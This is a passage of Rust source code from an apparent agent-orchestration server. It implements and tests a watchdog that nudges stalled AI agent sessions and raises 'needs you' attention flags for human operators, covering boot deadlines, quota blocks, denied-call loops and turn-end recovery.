                                settings.stall_minutes, settings.max_nudges
                            )
                        } else {
                            format!(
                                "watchdog: no progress for {} min, sent the agent the {} recovery ({nudges}/{})",
                                settings.stall_minutes,
                                other.as_str(),
                                settings.max_nudges
                            )
                        };
                        app.session_log_as(Origin::Watchdog, &s.id, "info", message).await;
                        app.update_session(&s.id, |x| {
                            x.attention =
                                Some(json!({"reason": "stalled", "since": activity.progress_reference(), "nudges": nudges}));
                        })
                        .await;
                    }
                }
            }
            Decision::Flag(reason) => {
                // Matched on the pair so only the two *starting* states get the boot wording: a
                // `stalled` from the nudge path, or from a state that does not exist yet, keeps the
                // mid-run line and cannot silently inherit starting-only meaning (issue #760).
                let message = match (reason, state) {
                    ("waiting_for_answer", _) => format!(
                        "watchdog: a question has been waiting for over {} min",
                        settings.waiting_minutes
                    ),
                    // The two `starting` cases say which half of the boot failed, so a slow image
                    // pull is never reported as a dead agent.
                    ("stalled", Observed::Starting { boot_total_ms: Some(_) }) => format!(
                        "watchdog: its boot finished more than {BOOT_LINK_DEADLINE_MINUTES} min ago and its agent \
                         still has not linked; this colony needs you — nothing it is doing can be seen"
                    ),
                    ("stalled", Observed::Starting { boot_total_ms: None }) => format!(
                        "watchdog: still `starting` {BOOT_DEADLINE_MINUTES} min after its slot came free with its \
                         boot unfinished; this colony needs you"
                    ),
                    _ => format!(
                        "watchdog: still no progress after {} nudges; this colony needs you",
                        activity.nudges
                    ),
                };
                let since = if reason == "waiting_for_answer" {
                    activity.question_since.unwrap_or(now)
                } else if let Observed::Starting { boot_total_ms } = state {
                    // The clock `decide` measured, not `progress_reference` (for a `starting` colony
                    // that is `Activity::last`, moved by gateway traffic): the UI should say the
                    // colony has needed you since the flag became due.
                    starting_reference(&activity, boot_total_ms).0
                } else {
                    activity.progress_reference()
                };
                flag(app, &s.id, reason, since, activity.nudges, message).await;
            }
            Decision::Clear => {
                app.update_session(&s.id, |x| x.attention = None).await;
            }
        }
    }
}

/// Raises the watchdog's flag on a colony: the attention flag the cockpit's "needs you" list and
/// notifications read, and the log line saying why, together (issue #760: the final "needs you"
/// must reach the cockpit, not only the log). The flag is written first, so a colony whose log
/// says it needs you always carries the flag that shows it.
async fn flag(app: &Shared, id: &str, reason: &str, since: DateTime<Utc>, nudges: u64, message: String) {
    app.update_session(id, |x| {
        x.attention = Some(json!({"reason": reason, "since": since, "nudges": nudges}));
    })
    .await;
    app.session_log_as(Origin::Watchdog, id, "error", message).await;
}

/// This module's background work, started once by `server::start_tasks` when the mothership serves.
pub(crate) fn start_tasks(app: &crate::Shared) {
    tokio::spawn(run(app.clone()));
}

#[cfg(test)]
mod tests {
    use super::*;

    const SETTINGS: WatchdogSettings = WatchdogSettings {
        enabled: true,
        stall_minutes: 15,
        max_nudges: 2,
        waiting_minutes: 30,
    };

    fn at(minutes: i64) -> DateTime<Utc> {
        DateTime::from_timestamp(1_789_000_000, 0).unwrap() + Duration::minutes(minutes)
    }

    #[test]
    fn working_colonies_are_nudged_once_per_interval_then_flagged() {
        let mut activity = Activity::new(at(0));
        assert_eq!(
            decide(&SETTINGS, at(14), Observed::Working, &activity, None),
            Decision::Nothing
        );
        assert_eq!(decide(&SETTINGS, at(15), Observed::Working, &activity, None), Decision::Nudge);

        activity.nudges = 1;
        activity.last_nudge = Some(at(15));
        assert_eq!(
            decide(&SETTINGS, at(20), Observed::Working, &activity, Some("stalled")),
            Decision::Nothing
        );
        assert_eq!(
            decide(&SETTINGS, at(30), Observed::Working, &activity, Some("stalled")),
            Decision::Nudge
        );

        activity.nudges = 2;
        activity.last_nudge = Some(at(30));
        assert_eq!(
            decide(&SETTINGS, at(44), Observed::Working, &activity, Some("stalled")),
            Decision::Nothing
        );
        assert_eq!(
            decide(&SETTINGS, at(45), Observed::Working, &activity, Some("stalled")),
            Decision::Flag("nudges_exhausted")
        );
        assert_eq!(
            decide(&SETTINGS, at(90), Observed::Working, &activity, Some("nudges_exhausted")),
            Decision::Nothing
        );
    }

    #[test]
    fn progress_after_a_nudge_restarts_the_clock() {
        let activity = Activity {
            last: at(20),
            admitted_at: at(20),
            nudges: 1,
            last_nudge: Some(at(15)),
            question_since: None,
            judged: 0,
            judge_failures: 0,
            risk_announced: None,
            recoveries: 0,
            denials: 0,
            denied_since: None,
            last_denial: None,
            boundaries: BoundaryTrail::default(),
        };
        assert_eq!(
            decide(&SETTINGS, at(34), Observed::Working, &activity, None),
            Decision::Nothing
        );
        assert_eq!(decide(&SETTINGS, at(35), Observed::Working, &activity, None), Decision::Nudge);
    }

    #[test]
    fn unanswered_questions_are_flagged_not_nudged() {
        let activity = Activity {
            last: at(0),
            admitted_at: at(0),
            nudges: 0,
            last_nudge: None,
            question_since: Some(at(0)),
            judged: 0,
            judge_failures: 0,
            risk_announced: None,
            recoveries: 0,
            denials: 0,
            denied_since: None,
            last_denial: None,
            boundaries: BoundaryTrail::default(),
        };
        assert_eq!(
            decide(&SETTINGS, at(29), Observed::WaitingForAnswer, &activity, None),
            Decision::Nothing
        );
        assert_eq!(
            decide(&SETTINGS, at(30), Observed::WaitingForAnswer, &activity, None),
            Decision::Flag("waiting_for_answer")
        );
        assert_eq!(
            decide(
                &SETTINGS,
                at(60),
                Observed::WaitingForAnswer,
                &activity,
                Some("waiting_for_answer")
            ),
            Decision::Nothing
        );
        assert_eq!(
            decide(&SETTINGS, at(61), Observed::Other, &activity, Some("waiting_for_answer")),
            Decision::Clear
        );
    }

    /// A colony whose agent never linked goes straight to the flag, never to a nudge (issue #760).
    /// The boot's own length is *not* charged against it; a boot that never finished gets the far
    /// longer floor. See [`starting_reference`].
    #[test]
    fn a_starting_colony_is_flagged_never_nudged() {
        // A boot that took 40 minutes (a cold image pull) and then finished: the link has had five
        // minutes, not forty — the false positive the deadline exists to prevent.
        let activity = Activity::new(at(0));
        let slow_boot = Observed::Starting {
            boot_total_ms: Some(40 * 60 * 1000),
        };
        assert_eq!(decide(&SETTINGS, at(45), slow_boot, &activity, None), Decision::Nothing);
        // The boot finished at minute 40, so the link's own 15-minute deadline falls at minute 55 —
        // not at minute 15, and not measured from the admission the cold pull was charging.
        assert_eq!(decide(&SETTINGS, at(54), slow_boot, &activity, None), Decision::Nothing);
        assert_eq!(
            decide(&SETTINGS, at(55), slow_boot, &activity, None),
            Decision::Flag("stalled"),
            "15 min after the boot finished the link has had its deadline"
        );
        // A boot still running — no `total_ms` yet — gets the whole floor: the pull in it is never
        // mistaken for a stalled agent, and a wedged boot still gets flagged.
        let booting = Observed::Starting { boot_total_ms: None };
        assert_eq!(decide(&SETTINGS, at(44), booting, &activity, None), Decision::Nothing);
        assert_eq!(decide(&SETTINGS, at(45), booting, &activity, None), Decision::Flag("stalled"));
        assert_eq!(
            decide(&SETTINGS, at(90), booting, &activity, Some("stalled")),
            Decision::Nothing,
            "the flag stands rather than repeating"
        );
        // No nudge is ever returned for this state, whatever the budget.
        for minutes in [15, 30, 600] {
            assert!(
                !matches!(decide(&SETTINGS, at(minutes), booting, &activity, None), Decision::Nudge),
                "a `starting` colony is never nudged, at {minutes} min"
            );
        }
        // Somebody else's flag is the more specific story and is left on the record.
        assert_eq!(
            decide(
                &SETTINGS,
                at(30),
                Observed::Starting { boot_total_ms: None },
                &activity,
                Some(crate::provider_quota::QUOTA_EXHAUSTED_REASON)
            ),
            Decision::Nothing
        );
        // A colony admitted only a few minutes ago is inside its window whatever happened after.
        let recent = Activity::new(at(20));
        assert_eq!(
            decide(
                &SETTINGS,
                at(34),
                Observed::Starting { boot_total_ms: Some(0) },
                &recent,
                None
            ),
            Decision::Nothing
        );
        // The point of `admitted_at`: the retrying colony in issue #760 reset `since` to now on
        // every tick before this.
        let mut busy = Activity::new(at(0));
        busy.note_gateway_busy(at(60));
        assert_eq!(
            busy.admitted_at,
            at(0),
            "gateway traffic moves the progress clock, not this one"
        );
        assert_eq!(decide(&SETTINGS, at(60), booting, &busy, None), Decision::Flag("stalled"));
    }

    /// A colony with a stalled runtime and its nudges spent, under a watchdog of 15 min / 2 nudges.
    async fn stalled_app(name: &str, status: SessionStatus) -> (Shared, std::path::PathBuf) {
        let root = std::env::temp_dir().join(format!("colonizer-watchdog-{name}-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(root.join("config")).unwrap();
        std::fs::write(
            root.join("config/orgs.json"),
            r#"{"acme": {"watchdog": {"enabled": true, "stall_minutes": 15, "max_nudges": 2}}}"#,
        )
        .unwrap();
        let app = crate::tests::test_app(&root);
        let mut s = crate::sessions::tests::colony("acme", status);
        s.id = "w1".into();
        s.allowed_providers = Some(vec!["bailian".into()]);
        app.sessions.write().await.push(s);
        std::fs::create_dir_all(app.session_dir("w1")).unwrap();
        let rt = app.runtime("w1").await;
        {
            let mut activity = rt.activity.lock().await;
            activity.last = Utc::now() - Duration::hours(2);
            activity.nudges = 2;
            activity.last_nudge = Some(Utc::now() - Duration::hours(1));
        }
        (app, root)
    }

    /// The fixture's colony admitted two hours ago with no nudges spent — overdue on the boot clock
    /// whatever its `last` says. Returns the admission stamp so a test can say what it expects the
    /// flag to be dated from.
    async fn stale_starting(app: &Shared) -> DateTime<Utc> {
        let rt = app.runtime("w1").await;
        let mut a = rt.activity.lock().await;
        a.nudges = 0;
        a.last_nudge = None;
        a.admitted_at = Utc::now() - Duration::hours(2);
        a.admitted_at
    }

    /// The `since` an attention record carries, read back off the JSON the cockpit reads.
    fn since_of(attention: &Value) -> DateTime<Utc> {
        let s = attention["since"].as_str().expect("since is stamped");
        DateTime::parse_from_rfc3339(s).unwrap().with_timezone(&Utc)
    }

    /// The final "this colony needs you" raises the attention flag the cockpit reads, not only a
    /// log line (issue #760), and gateway traffic alone does not take it down again.
    #[tokio::test]
    async fn the_final_needs_you_sets_the_attention_flag() {
        let (app, root) = stalled_app("flag", SessionStatus::Running).await;
        check_all(&app).await;
        let attention = app.session("w1").await.unwrap().attention.expect("flagged");
        assert_eq!(attention["reason"], "nudges_exhausted");
        assert_eq!(attention["nudges"], 2);
        let logs = app.runtime("w1").await.logs.lock().await.clone();
        assert!(
            logs.iter()
                .any(|l| l["message"].as_str().is_some_and(|m| m.contains("this colony needs you"))),
            "and the log says so: {logs:?}"
        );
        check_all(&app).await;
        assert_eq!(
            app.session("w1").await.unwrap().attention.unwrap()["reason"],
            "nudges_exhausted",
            "the flag stays up"
        );
        let _ = std::fs::remove_dir_all(root);
    }

    /// Issue #981: a `waiting_for_answer` record with no question tracked is stuck — the answer was
    /// taken and no runner status followed. The watchdog reconciles it to `idle`, on the record and
    /// in the log, rather than leaving a colony the cockpit flags as needing you while `ask` can
    /// answer nothing on it.
    #[tokio::test]
    async fn a_waiting_for_answer_with_no_question_is_reconciled_to_idle() {
        let (app, root) = stalled_app("reconcile", SessionStatus::WaitingForAnswer).await;
        assert_eq!(
            app.session("w1").await.unwrap().status,
            SessionStatus::WaitingForAnswer,
            "starts stuck"
        );
        check_all(&app).await;
        let s = app.session("w1").await.unwrap();
        assert_eq!(s.status, SessionStatus::Idle, "the stale wait is reconciled");
        assert!(s.attention.is_none(), "and its stale attention flag cleared");
        let logs = app.runtime("w1").await.logs.lock().await.clone();
        assert!(
            logs.iter()
                .any(|l| l["message"].as_str().is_some_and(|m| m.contains("no question is pending"))),
            "the log says why: {logs:?}"
        );
        let _ = std::fs::remove_dir_all(root);
    }

    /// The reconciliation must leave a colony whose question is genuinely open: its wait is real,
    /// and `ask` can answer it.
    #[tokio::test]
    async fn a_waiting_for_answer_with_an_open_question_is_left_alone() {
        let (app, root) = stalled_app("keep", SessionStatus::WaitingForAnswer).await;
        *app.runtime("w1").await.open_question.lock().await = Some((
            "q1".into(),
            vec![json!({"question": "Push now?"})],
            crate::protocol::QuestionRisk::WorkspaceWrite,
        ));
        check_all(&app).await;
        assert_eq!(
            app.session("w1").await.unwrap().status,
            SessionStatus::WaitingForAnswer,
            "a real question keeps its status"
        );
        let _ = std::fs::remove_dir_all(root);
    }

    /// With the recovery point off, a nudge is byte-for-byte the log line it always was (issue #586):
    /// the decision point must not change what a colony sees when it is not switched on.
    #[tokio::test]
    async fn an_off_recovery_point_nudges_with_the_original_log_line() {
        let (app, root) = stalled_app("nudge-line", SessionStatus::Running).await;
        {
            let rt = app.runtime("w1").await;
            let mut activity = rt.activity.lock().await;
            activity.nudges = 0;
            activity.last_nudge = None;
        }
        check_all(&app).await;
        let logs = app.runtime("w1").await.logs.lock().await.clone();
        assert!(
            logs.iter().any(|l| l["message"]
                .as_str()
                .is_some_and(|m| m.contains("no progress for 15 min, nudged the agent (1/2)"))),
            "the off-mode nudge line is unchanged: {logs:?}"
        );
        let _ = std::fs::remove_dir_all(root);
    }

    /// A colony whose recent calls were all denied is nudged (issue #609), and the nudge names the
    /// denied boundary with a log line that says it was a hint loop.
    #[tokio::test]
    async fn a_hint_loop_is_nudged_naming_the_denial() {
        let (app, root) = stalled_app("hint-loop", SessionStatus::Running).await;
        {
            let rt = app.runtime("w1").await;
            let mut activity = rt.activity.lock().await;
            activity.nudges = 0;
            activity.last_nudge = None;
            activity.denials = 3;
            activity.denied_since = Some(Utc::now() - Duration::hours(2));
            activity.last_denial = Some(("egress".to_string(), "denied host example.com".to_string()));
        }
        check_all(&app).await;
        let logs = app.runtime("w1").await.logs.lock().await.clone();
        assert!(
            logs.iter().any(|l| l["message"]
                .as_str()
                .is_some_and(|m| m.contains("3 tool calls denied in a row (egress), nudged the agent (1/2)"))),
            "the log says it was a hint loop: {logs:?}"
        );
        let _ = std::fs::remove_dir_all(root);
    }

    /// A colony blocked on an exhausted provider gets the quota flag and is not nudged: another
    /// request cannot be answered until the plan resets (issue #760).
    #[tokio::test]
    async fn a_quota_blocked_colony_is_flagged_with_the_quota_reason_not_nudged() {
        let (app, root) = stalled_app("quota", SessionStatus::Running).await;
        app.gateway
            .mark_quota_exhausted("bailian", None, Some(Utc::now().timestamp() + 600));
        app.gateway.note_colony_quota("w1", "bailian");
        check_all(&app).await;
        let attention = app.session("w1").await.unwrap().attention.expect("flagged");
        assert_eq!(attention["reason"], crate::provider_quota::QUOTA_EXHAUSTED_REASON);
        assert_eq!(attention["provider"], "bailian");
        let _ = std::fs::remove_dir_all(root);
    }

    /// A colony whose boot finished but whose agent never linked is flagged, not nudged, and the
    /// log line is the one that says the agent never linked, not the one that blames an unfinished
    /// boot (issue #760).
    #[tokio::test]
    async fn a_starting_colony_with_no_agent_turn_is_flagged_not_nudged() {
        let (app, root) = stalled_app("boot", SessionStatus::Starting).await;
        stale_starting(&app).await;
        // The boot ran for ten minutes and finished: the link has then had the fixture's two hours
        // to come up.
        app.update_session("w1", |s| {
            s.boot_timing = Some(json!({ "total_ms": 600_000, "phases": [] }));
            true
        })
        .await;
        check_all(&app).await;
        let s = app.session("w1").await.unwrap();
        let attention = s.attention.expect("flagged");
        assert_eq!(s.status, SessionStatus::Starting, "the watchdog does not move the status");
        assert_eq!(attention["reason"], "stalled");
        assert_eq!(attention["nudges"], 0, "and it did not nudge");
        let logs = app.runtime("w1").await.logs.lock().await.clone();
        assert!(
            logs.iter().any(|l| l["message"]
                .as_str()
                .is_some_and(|m| m.contains("its agent still has not linked"))),
            "the log names the link that never came, not a boot still running: {logs:?}"
        );
        assert!(
            logs.iter()
                .any(|l| l["message"].as_str().is_some_and(|m| m.contains("this colony needs you"))),
            "and says the colony needs you: {logs:?}"
        );
        check_all(&app).await;
        assert_eq!(
            app.session("w1").await.unwrap().attention.unwrap()["reason"],
            "stalled",
            "the flag stands rather than repeating"
        );
        let _ = std::fs::remove_dir_all(root);
    }

    /// A boot still inside its deadline is left alone: the long boot must not be charged against the
    /// link (issue #760).
    #[tokio::test]
    async fn a_starting_colony_inside_the_boot_window_is_left_alone() {
        let (app, root) = stalled_app("boot-grace", SessionStatus::Starting).await;
        {
            let rt = app.runtime("w1").await;
            let mut activity = rt.activity.lock().await;
            activity.nudges = 0;
            // A cold image pull: forty minutes into a boot that has not finished yet, and well past
            // the fixture's `stall_minutes` of 15 — under the old clock that was the false positive,
            // an agent reported dead while it was still downloading gigabytes. `last` is set
            // alongside so nothing else sees a stale clock either.
            activity.admitted_at = Utc::now() - Duration::minutes(40);
            activity.last = activity.admitted_at;
        }
        check_all(&app).await;
        assert!(
            app.session("w1").await.unwrap().attention.is_none(),
            "forty minutes into a cold boot, that boot is still a boot"
        );
        // The same colony once the boot has finished and the link is overdue: now it is a flag.
        app.update_session("w1", |s| {
            s.boot_timing = Some(json!({ "total_ms": 600_000, "phases": [] }));
            true
        })
        .await;
        check_all(&app).await;
        assert_eq!(
            app.session("w1").await.unwrap().attention.expect("flagged")["reason"],
            "stalled"
        );
        let _ = std::fs::remove_dir_all(root);
    }

    /// Gateway traffic must not take down the boot flag (issue #760): a `starting` colony whose
    /// agent is evidently making requests but never linked still needs a person, and
    /// `note_gateway_busy` has already restarted its clock.
    #[tokio::test]
    async fn gateway_traffic_does_not_clear_a_starting_colonys_stall_flag() {
        let (app, root) = stalled_app("busy-boot", SessionStatus::Starting).await;
        stale_starting(&app).await;
        app.update_session("w1", |s| {
            s.boot_timing = Some(json!({ "total_ms": 600_000, "phases": [] }));
            true
        })
        .await;
        check_all(&app).await;
        assert_eq!(
            app.session("w1").await.unwrap().attention.expect("flagged")["reason"],
            "stalled"
        );
        // An in-flight request, the same shape `gateway/tests.rs` uses via `Counted`.
        let counter = app.gateway.colony_counter("w1");
        counter.fetch_add(1, Ordering::SeqCst);
        check_all(&app).await;
        assert_eq!(
            app.session("w1").await.unwrap().attention.expect("the flag stands")["reason"],
            "stalled",
            "gateway traffic must not clear a stuck boot's flag"
        );
        counter.fetch_sub(1, Ordering::SeqCst);
        let _ = std::fs::remove_dir_all(root);
    }

    /// The narrowness of that exemption: a *different* reason's flag on a `starting` colony is
    /// still cleared under gateway traffic, as it was before the boot arm existed.
    #[tokio::test]
    async fn gateway_traffic_still_clears_another_reason_on_a_starting_colony() {
        let (app, root) = stalled_app("busy-other", SessionStatus::Starting).await;
        app.update_session("w1", |s| {
            s.attention = Some(json!({ "reason": "agent_failed" }));
            true
        })
        .await;
        let counter = app.gateway.colony_counter("w1");
        counter.fetch_add(1, Ordering::SeqCst);
        check_all(&app).await;
        assert!(
            app.session("w1").await.unwrap().attention.is_none(),
            "only this watchdog's own boot flag is exempt"
        );
        counter.fetch_sub(1, Ordering::SeqCst);
        let _ = std::fs::remove_dir_all(root);
    }

    /// The regression for the clock the exemption could not create (issue #760): this is the colony
    /// the issue describes — an agent that keeps issuing requests and keeps getting refused, whose
    /// status never leaves `starting` and whose event stream never links. `note_gateway_busy` runs
    /// before `decide` on every tick and moves `Activity::last` to now, so a `starting` window read
    /// off `last` restarts every tick and the flag can never be raised. It reads
    /// `Activity::admitted_at` instead.
    #[tokio::test]
    async fn sustained_gateway_traffic_does_not_hide_a_stuck_boot_forever() {
        // No `boot_timing` at all: the boot never finished, so the wider `BOOT_DEADLINE_MINUTES`
        // floor applies, and two hours is well past it.
        let (app, root) = stalled_app("busy-forever", SessionStatus::Starting).await;
        stale_starting(&app).await;
        // The request in flight, held across every tick below — the shape `gateway/tests.rs` uses
        // via `Counted`, which is private to the gateway module.
        let counter = app.gateway.colony_counter("w1");
        counter.fetch_add(1, Ordering::SeqCst);
        check_all(&app).await;
        let attention = app
            .session("w1")
            .await
            .unwrap()
            .attention
            .expect("flagged despite the traffic");
        assert_eq!(attention["reason"], "stalled");
        assert!(
            app.runtime("w1").await.activity.lock().await.last > Utc::now() - Duration::minutes(1),
            "the gateway clock really did move, so the flag cannot have come off it"
        );
        // The next tick, with the request *still* in flight, must not take it down.
        check_all(&app).await;
        assert_eq!(
            app.session("w1").await.unwrap().attention.expect("the flag stands")["reason"],
            "stalled",
            "sustained traffic must not postpone the flag a second time"
        );
        counter.fetch_sub(1, Ordering::SeqCst);
        let _ = std::fs::remove_dir_all(root);
    }

    /// The `since` on the record is the clock the decision was made on (issue #760), so the cockpit
    /// says the colony has needed someone since the flag became due rather than since the last thing
    /// the gateway happened to see.
    #[tokio::test]
    async fn a_starting_colonys_since_is_the_window_the_flag_was_decided_on() {
        let (app, root) = stalled_app("since", SessionStatus::Starting).await;
        let admitted = stale_starting(&app).await;
        // A progress clock at a *different*, much later instant, so the assertions can tell the two
        // apart: `progress_reference` would report this one.
        app.runtime("w1").await.activity.lock().await.last = Utc::now() - Duration::minutes(30);
        // A ten-minute boot: the link's window opened at `admitted_at + 600_000`.
        app.update_session("w1", |s| {
            s.boot_timing = Some(json!({ "total_ms": 600_000, "phases": [] }));
            true
        })
        .await;
        check_all(&app).await;
        let attention = app.session("w1").await.unwrap().attention.expect("flagged");
        assert_eq!(attention["reason"], "stalled");
        assert_eq!(
            since_of(&attention),
            admitted + Duration::milliseconds(600_000),
            "the boot-end reference, not the admission instant and not the progress clock"
        );
        // And the same for the boot-unfinished case, where the window opens at admission itself.
        let (app2, root2) = stalled_app("since-boot", SessionStatus::Starting).await;
        let admitted2 = stale_starting(&app2).await;
        check_all(&app2).await;
        let attention = app2.session("w1").await.unwrap().attention.expect("flagged");
        assert_eq!(since_of(&attention), admitted2);
        let _ = std::fs::remove_dir_all(root);
        let _ = std::fs::remove_dir_all(root2);
    }

    #[test]
    fn disabled_watchdog_clears_only_its_own_attention() {
        let settings = WatchdogSettings {
            enabled: false,
            ..SETTINGS
        };
        let activity = Activity::new(at(0));
        assert_eq!(
            decide(&settings, at(500), Observed::Working, &activity, None),
            Decision::Nothing
        );
        assert_eq!(
            decide(&settings, at(500), Observed::Working, &activity, Some("stalled")),
            Decision::Clear
        );
        assert_eq!(
            decide(&settings, at(500), Observed::Other, &activity, Some("autopilot_held")),
            Decision::Nothing
        );
        assert_eq!(
            decide(&SETTINGS, at(500), Observed::Other, &activity, Some("autopilot_held")),
            Decision::Nothing
        );
    }

    #[test]
    fn a_turn_is_finished_only_when_the_runner_is_quiet() {
        let now = at(0);
        let stale = now - Duration::seconds(120);
        assert!(turn_end_due(now, Some(stale), 0, false, false), "the grace is met");
        assert!(
            !turn_end_due(now, Some(now - Duration::seconds(119)), 0, false, false),
            "inside the grace it is left alone"
        );
        assert!(!turn_end_due(now, None, 0, false, false), "no final answer to finish");
        assert!(!turn_end_due(now, Some(stale), 1, false, false), "a tool call is in flight");
        assert!(!turn_end_due(now, Some(stale), 0, true, false), "a question is open");
        assert!(
            !turn_end_due(now, Some(stale), 0, false, true),
            "a gateway request is in flight"
        );
    }

    #[test]
    fn only_a_running_runner_is_read_as_alive() {
        assert!(runner_running(r#"{"agent":{"running":true,"state":"working"}}"#));
        assert!(!runner_running(r#"{"agent":{"running":false,"state":"idle"}}"#));
        assert!(!runner_running("{}"));
        assert!(!runner_running("not json"));
    }

    /// A colony with agentd answering `/v1/health` with `body` on a local port, its token on disk,
    /// and its stall clock quiet, so only the turn-end recovery is under test. The probe walks the
    /// real path (`sessions::agentd::agentd_http`), not a stub.
    async fn app_with_agentd(name: &str, body: &str) -> (Shared, std::path::PathBuf) {
        let (app, root) = stalled_app(name, SessionStatus::Running).await;
        {
            let rt = app.runtime("w1").await;
            let mut activity = rt.activity.lock().await;
            activity.last = Utc::now();
            activity.nudges = 0;
            activity.last_nudge = None;
        }
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        let response = format!(
            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        tokio::spawn(async move {
            while let Ok((mut stream, _)) = listener.accept().await {
                let response = response.clone();
                tokio::spawn(async move {
                    use tokio::io::{AsyncReadExt, AsyncWriteExt};
                    let mut buf = [0u8; 1024];
                    let _ = stream.read(&mut buf).await;
                    let _ = stream.write_all(response.as_bytes()).await;
                });
            }
        });
        let vm = app.session_dir("w1").join("vm");
        std::fs::create_dir_all(&vm).unwrap();
        std::fs::write(vm.join("token"), "test-token\n").unwrap();
        app.update_session("w1", |x| x.local_port = Some(port)).await;
        (app, root)
    }

    /// Acceptance (issue #878): a final answer the runner never ended, with agentd still answering,
    /// is finished — the `watchdog_turn_end` event is recorded and the turn-end path runs.
    #[tokio::test]
    async fn a_final_answer_the_runner_never_ended_is_finished() {
        let (app, root) = app_with_agentd("finish", r#"{"agent":{"running":true,"state":"working"}}"#).await;
        app.update_session("w1", |x| x.autopilot = true).await;
        let rt = app.runtime("w1").await;
        crate::events::handle_agent_event(
            &app,
            "w1",
            &rt,
            r#"{"seq":1,"type":"assistant_text","message_id":"m","block_index":0,"text":"all done"}"#,
        )
        .await;
        // Two minutes pass with the runner silent: the final answer's clock is what the watchdog reads.
        rt.final_text_at.lock().await.replace(Utc::now() - Duration::minutes(3));
        check_all(&app).await;

        assert!(rt.final_text_at.lock().await.is_none(), "the claim is spent");
        let events = std::fs::read_to_string(app.session_dir("w1").join("events.jsonl")).unwrap();
        assert!(
            events.contains(r#""type":"watchdog_turn_end""#),
            "the end is on the record: {events}"
        );
        // The turn-end path ran: its autopilot decision is in the colony's log.
        let logs = rt.logs.lock().await.clone();
        assert!(
            logs.iter()
                .any(|l| l["message"].as_str().is_some_and(|m| m.contains("finishing the turn"))),
            "{logs:?}"
        );
        assert!(
            logs.iter().any(|l| l["message"]
                .as_str()
                .is_some_and(|m| m.contains("autopilot: not publishing yet"))),
            "the ordinary turn-end path ran: {logs:?}"
        );
        let _ = std::fs::remove_dir_all(root);
    }

    /// Acceptance: a tool call in flight is not an ended turn, so it is left alone.
    #[tokio::test]
    async fn a_tool_call_in_flight_holds_the_turn_open() {
        let (app, root) = app_with_agentd("tool", r#"{"agent":{"running":true,"state":"working"}}"#).await;
        let rt = app.runtime("w1").await;
        rt.final_text_at.lock().await.replace(Utc::now() - Duration::minutes(3));
        rt.open_tool_calls.lock().await.insert("toolu_1".into());
        check_all(&app).await;
        assert!(
            rt.final_text_at.lock().await.is_some(),
            "not finished while a call is in flight"
        );
        assert!(
            !std::fs::read_to_string(app.session_dir("w1").join("events.jsonl"))
                .unwrap_or_default()
                .contains("watchdog_turn_end")
        );
        let _ = std::fs::remove_dir_all(root);
    }

    /// Acceptance: a request in flight through the gateway is progress, not a wedge.
    #[tokio::test]
    async fn a_gateway_request_in_flight_holds_the_turn_open() {
        let (app, root) = app_with_agentd("busy", r#"{"agent":{"running":true,"state":"working"}}"#).await;
        let rt = app.runtime("w1").await;
        rt.final_text_at.lock().await.replace(Utc::now() - Duration::minutes(3));
        app.gateway.colony_counter("w1").fetch_add(1, Ordering::SeqCst);
        check_all(&app).await;
        assert!(
            rt.final_text_at.lock().await.is_some(),
            "not finished while the gateway is busy"
        );
        let _ = std::fs::remove_dir_all(root);
    }

    /// Acceptance: the probe can take seconds, and a busy agent is not interrupted. If the runner
    /// starts a tool call while the probe is in flight, the end is not synthesised even though the
    /// probe answers that the runner is alive — the state is re-read after the probe.
    #[tokio::test]
    async fn a_tool_call_started_during_the_probe_holds_the_turn_open() {
        let (app, root) = stalled_app("race", SessionStatus::Running).await;
        let rt = app.runtime("w1").await;
        {
            let mut activity = rt.activity.lock().await;
            activity.last = Utc::now();
            activity.nudges = 0;
            activity.last_nudge = None;
            rt.final_text_at.lock().await.replace(Utc::now() - Duration::minutes(3));
        }
        // A health stub that opens a tool call on the real Runtime *before* it answers, standing in
        // for the runner beginning work during the probe's window.
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        let body = r#"{"agent":{"running":true,"state":"working"}}"#;
        let response = format!(
            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let stub_rt = rt.clone();
        tokio::spawn(async move {
            while let Ok((mut stream, _)) = listener.accept().await {
                let response = response.clone();
                let rt = stub_rt.clone();
                tokio::spawn(async move {
                    use tokio::io::{AsyncReadExt, AsyncWriteExt};
                    let mut buf = [0u8; 1024];
                    let _ = stream.read(&mut buf).await;
                    rt.open_tool_calls.lock().await.insert("toolu_race".into());
                    let _ = stream.write_all(response.as_bytes()).await;
                });
            }
        });
        let vm = app.session_dir("w1").join("vm");
        std::fs::create_dir_all(&vm).unwrap();
        std::fs::write(vm.join("token"), "test-token\n").unwrap();
        app.update_session("w1", |x| x.local_port = Some(port)).await;

        check_all(&app).await;

        assert!(
            rt.final_text_at.lock().await.is_some(),
            "the claim is kept: the runner started working during the probe"
        );
        assert!(
            !std::fs::read_to_string(app.session_dir("w1").join("events.jsonl"))
                .unwrap_or_default()
                .contains("watchdog_turn_end"),
            "no end is synthesised for a busy runner"
        );
        let _ = std::fs::remove_dir_all(root);
    }

    /// A colony whose agentd is gone is wedged, not finished: the recovery keeps the final answer so
    /// the next tick can retry, logs that it could not run once (not once per tick), and leaves the
    /// colony to the stall handling rather than restarting it.
    #[tokio::test]
    async fn an_unreachable_agentd_leaves_the_turn_to_the_stall_handling() {
        let (app, root) = stalled_app("wedged", SessionStatus::Running).await;
        let rt = app.runtime("w1").await;
        {
            let mut activity = rt.activity.lock().await;
            activity.last = Utc::now();
            activity.nudges = 0;
            activity.last_nudge = None;
            rt.final_text_at.lock().await.replace(Utc::now() - Duration::minutes(3));
        }
        // No token file and no local port: dial_agentd fails at once, as an unreachable agentd would.
        check_all(&app).await;
        check_all(&app).await;
        assert!(
            rt.final_text_at.lock().await.is_some(),
            "a probe that failed leaves the claim for the next tick to retry"
        );
        let logs = rt.logs.lock().await.clone();
        assert_eq!(
            logs.iter()
                .filter(|l| l["message"].as_str().is_some_and(|m| m.contains("agentd is not answering")))
                .count(),
            1,
            "logged once per final answer, not once per tick: {logs:?}"
        );
        let _ = std::fs::remove_dir_all(root);
    }

    /// A hint loop is nudged on the progress that preceded it: a retried call that moved `last`
    /// forward does not hold the nudge off (issue #609).
    #[test]
